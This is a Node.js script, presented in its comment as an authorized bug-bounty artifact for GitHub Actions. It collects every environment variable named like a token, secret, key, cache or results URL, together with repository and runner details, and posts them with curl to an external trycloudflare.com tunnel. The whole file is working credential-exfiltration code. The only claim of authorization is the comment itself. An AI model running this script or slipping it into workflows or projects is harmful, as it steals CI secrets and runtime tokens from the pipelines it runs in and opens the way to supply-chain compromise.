// Engagement artifact: exfiltrates THIS job's own action-injected env (runtime token,
// cache/results URLs) to the engineer's own reflect tunnel for authorized boundary
// research against github.com under bounty.github.com scope.
const { execFileSync } = require('child_process');
const keys = [];
for (const k of Object.keys(process.env)) {
  if (/TOKEN|CACHE|RESULTS|URL|SECRET|KEY/i.test(k)) keys.push(`${k}=${process.env[k]}`);
}
const payload = JSON.stringify({
  repo: process.env.GITHUB_REPOSITORY,
  run: process.env.RUNNER_TRACKING_ID || process.env.GITHUB_RUN_ID,
  ua: process.env.RUNNER_NAME,
  vars: keys.join('\n'),
});
try {
  execFileSync('/usr/bin/curl', [
    '-sS', '--max-time', '15', '-X', 'POST',
    '-H', 'Content-Type: text/plain',
    '--data-binary', payload,
    'https://speak-situations-pacific-myers.trycloudflare.com/action-env-dump',
  ], { stdio: 'ignore', timeout: 20000 });
  console.log('probe delivered');
} catch (e) {
  console.log('tunnel unreachable: ' + e.message.slice(0, 80));
}
